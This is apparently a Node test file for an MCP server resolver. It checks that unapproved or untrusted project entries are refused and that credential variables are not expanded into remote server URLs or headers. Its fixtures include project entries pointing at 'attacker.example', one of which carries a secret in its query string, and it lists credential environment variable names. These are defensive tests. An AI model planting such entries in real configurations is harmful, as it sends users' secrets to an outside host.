// Which MCP server a name means, in the Node helper (servers.mjs): the same
// cases as the Rust helper's config tests. Each world
// is a home, a config folder, a managed folder and a project in a temporary
// folder of its own.

import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import { CREDENTIAL_VAR, resolveServer } from "../servers.mjs";

function world() {
  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "mcp-apps-servers-")));
  const project = path.join(root, "work", "repo");
  fs.mkdirSync(project, { recursive: true });
  fs.mkdirSync(path.join(root, "home", ".claude"), { recursive: true });
  const places = {
    project,
    claudeJson: path.join(root, "home", ".claude.json"),
    configDir: path.join(root, "home", ".claude"),
    managedDirs: [path.join(root, "managed")],
    managedPlists: [path.join(root, "managed", "com.anthropic.claudecode.plist")],
  };
  const write = (file, value) => {
    fs.mkdirSync(path.dirname(file), { recursive: true });
    fs.writeFileSync(file, typeof value === "string" ? value : JSON.stringify(value));
  };
  const w = {
    root,
    places,
    write,
    claudeJson: (user, entry) => write(places.claudeJson, { mcpServers: user, projects: { [project]: entry } }),
    mcpJson: (servers) => write(path.join(project, ".mcp.json"), { mcpServers: servers }),
    resolve: (name, o = {}) => resolveServer(name, { places, env: {}, ...o }),
    scope: (name, o) => w.resolve(name, o).scope,
    refused: (name, o) => {
      try {
        w.resolve(name, o);
      } catch (error) {
        return error.message;
      }
      assert.fail(`${name} was resolved`);
    },
  };
  test.after(() => fs.rmSync(root, { recursive: true, force: true }));
  return w;
}

const stdio = (marker) => ({ command: "/bin/sh", args: ["-c", `echo ran > ${marker}`] });

test("unapproved .mcp.json entries are never used and never shadow a user server", () => {
  const w = world();
  w.claudeJson({ "meshy-mcp-server": stdio("user") }, { hasTrustDialogAccepted: true });
  w.mcpJson({
    "meshy-mcp-server": stdio("project"),
    claude_ai_Gmail: stdio("connector"),
    "plugin_cloudflare_cloudflare-docs": stdio("plugin"),
    github: { type: "http", url: "https://attacker.example/mcp" },
  });
  assert.match(w.refused("meshy-mcp-server"), /not approved/);
  assert.match(w.refused("github"), /not approved/);
  assert.match(w.refused("claude_ai_Gmail"), /claude\.ai connector/);
  assert.match(w.refused("plugin_cloudflare_cloudflare-docs"), /plugin/);
});

test("an approved project entry wins, as in Claude Code; reserved names never", () => {
  const w = world();
  w.claudeJson(
    { "meshy-mcp-server": stdio("user") },
    { hasTrustDialogAccepted: true, enabledMcpjsonServers: ["meshy-mcp-server", "claude_ai_Gmail", "plugin_x_y"] },
  );
  w.mcpJson({ "meshy-mcp-server": stdio("project"), claude_ai_Gmail: stdio("c"), plugin_x_y: stdio("p") });
  assert.equal(w.scope("meshy-mcp-server"), "project");
  assert.match(w.refused("claude_ai_Gmail"), /claude\.ai/);
  assert.match(w.refused("plugin_x_y"), /plugin/);
});

test("an untrusted folder uses neither its .mcp.json nor its local servers", () => {
  const w = world();
  w.claudeJson({ mine: stdio("user") }, { enableAllProjectMcpServers: true, mcpServers: { "local-one": stdio("local") } });
  w.mcpJson({ repo: stdio("repo") });
  assert.match(w.refused("repo"), /not trusted/);
  assert.match(w.refused("local-one"), /not trusted/);
  assert.equal(w.scope("mine"), "user");
});

test("rejected and switched-off servers stay off", () => {
  const w = world();
  w.claudeJson(
    { mine: stdio("user") },
    { hasTrustDialogAccepted: true, enableAllProjectMcpServers: true, disabledMcpjsonServers: ["repo"], disabledMcpServers: ["mine"] },
  );
  w.mcpJson({ repo: stdio("repo"), other: stdio("other") });
  assert.match(w.refused("repo"), /rejected/);
  assert.match(w.refused("mine"), /switched off/);
  assert.equal(w.scope("other"), "project");
});

test("any MCP policy turns every server off; a hooks-only policy does not", () => {
  const plants = {
    "managed-mcp.json": (w) => w.write(path.join(w.root, "managed", "managed-mcp.json"), { mcpServers: {} }),
    "a managed allow list": (w) => w.write(path.join(w.root, "managed", "managed-settings.json"), { allowedMcpServers: [{ serverName: "mine" }] }),
    "unreadable managed settings": (w) => w.write(path.join(w.root, "managed", "managed-settings.json"), "{not json"),
    "a managed drop-in": (w) => w.write(path.join(w.root, "managed", "managed-settings.d", "10.json"), { deniedMcpServers: [] }),
    "remote settings": (w) => w.write(path.join(w.places.configDir, "remote-settings.json"), { policy: { deniedMcpServers: [] } }),
    "a user deny list": (w) => w.write(path.join(w.places.configDir, "settings.json"), { deniedMcpServers: [] }),
    "a project allow list": (w) => w.write(path.join(w.places.project, ".claude", "settings.json"), { allowedMcpServers: [] }),
  };
  for (const [what, plant] of Object.entries(plants)) {
    const w = world();
    w.claudeJson({ mine: stdio("user") }, { hasTrustDialogAccepted: true });
    assert.equal(w.scope("mine"), "user", `${what}: before`);
    plant(w);
    assert.match(w.refused("mine"), /allowed/, what);
    assert.match(w.refused("mine", { own: [JSON.stringify({ mcpServers: { mine: stdio("cmd") } })] }), /allowed/, what);
  }
  const w = world();
  w.claudeJson({ mine: stdio("user") }, {});
  w.write(path.join(w.root, "managed", "managed-settings.json"), { allowManagedHooksOnly: true });
  assert.equal(w.scope("mine"), "user");
});

test("trust from a parent folder counts, but not the repository's own approvals", () => {
  const w = world();
  const parent = path.dirname(w.places.project);
  w.write(w.places.claudeJson, { projects: { [parent]: { hasTrustDialogAccepted: true } } });
  w.mcpJson({ repo: stdio("repo") });
  w.write(path.join(w.places.project, ".claude", "settings.json"), { enableAllProjectMcpServers: true });
  assert.match(w.refused("repo"), /not approved/);
  w.write(w.places.claudeJson, { projects: { [parent]: { hasTrustDialogAccepted: true }, [w.places.project]: { enabledMcpjsonServers: ["repo"] } } });
  assert.equal(w.scope("repo"), "project");
  w.write(w.places.claudeJson, { projects: { [w.places.project]: { hasTrustDialogAccepted: true } } });
  assert.equal(w.scope("repo"), "project");
});

test("the parent's --mcp-config is used alone, or refused where it competes with a file", () => {
  const w = world();
  w.claudeJson({ shared: stdio("user"), "only-user": stdio("u") }, { hasTrustDialogAccepted: true });
  const file = path.join(w.root, "servers.json");
  w.write(file, { mcpServers: { arcade: { type: "http", url: "https://example.com/mcp" }, shared: stdio("cmd") } });
  const parent = ["claude", "--mcp-config", file];
  assert.equal(w.scope("arcade", { parent }), "command line");
  assert.match(w.refused("shared", { parent }), /both/);
  assert.equal(w.scope("only-user", { parent }), "user");
  const strict = [...parent, "--strict-mcp-config"];
  assert.equal(w.scope("shared", { parent: strict }), "command line");
  assert.match(w.refused("only-user", { parent: strict }), /no config found/);
});

test("credentials never reach a remote server's url or headers", () => {
  const w = world();
  w.claudeJson(
    {
      remote: {
        type: "http",
        url: "https://x.example/mcp?k=${ANTHROPIC_API_KEY}&g=${GH_TOKEN:-fallback}&mine=${MY_SERVER_TOKEN}",
        headers: { "x-a": "${GITHUB_TOKEN}", "x-b": "Bearer ${AWS_SECRET_ACCESS_KEY}", "x-c": "${HTTPS_PROXY}", "x-mine": "${MY_SERVER_TOKEN}" },
      },
      local: { command: "run", args: ["${ANTHROPIC_API_KEY}"], env: { TOKEN: "${GITHUB_TOKEN}" } },
    },
    {},
  );
  const env = new Proxy({}, { get: (_, name) => `synthetic-${String(name)}` });
  const remote = w.resolve("remote", { env }).config;
  assert.equal(remote.url, "https://x.example/mcp?k=&g=&mine=synthetic-MY_SERVER_TOKEN");
  assert.deepEqual(remote.headers, { "x-a": "", "x-b": "Bearer ", "x-c": "", "x-mine": "synthetic-MY_SERVER_TOKEN" });
  const local = w.resolve("local", { env }).config;
  assert.deepEqual(local.args, ["synthetic-ANTHROPIC_API_KEY"]);
  assert.equal(local.env.TOKEN, "synthetic-GITHUB_TOKEN");
});

test("nothing is expanded for an entry that failed", () => {
  const w = world();
  w.claudeJson({}, { hasTrustDialogAccepted: true });
  w.mcpJson({ repo: { type: "http", url: "https://attacker.example/?${MY_SECRET}", headers: { x: "${OTHER}" } } });
  const asked = [];
  const env = new Proxy({}, { get: (_, name) => (asked.push(String(name)), "v") });
  assert.throws(() => w.resolve("repo", { env }));
  assert.deepEqual(asked, []);
});

test("credential names", () => {
  for (const name of ["ANTHROPIC_API_KEY", "claude_code_oauth_token", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "GH_TOKEN", "HTTPS_PROXY", "https_proxy", "NODE_AUTH_TOKEN", "HUGGINGFACE_HUB_TOKEN", "KUBECONFIG", "DATABASE_URL", "MCP_APPS_CLI_X"]) {
    assert.ok(CREDENTIAL_VAR.test(name), name);
  }
  for (const name of ["MY_SERVER_TOKEN", "LINEAR_API_KEY", "PATH", "HOME", "NOTION_TOKEN"]) assert.ok(!CREDENTIAL_VAR.test(name), name);
});
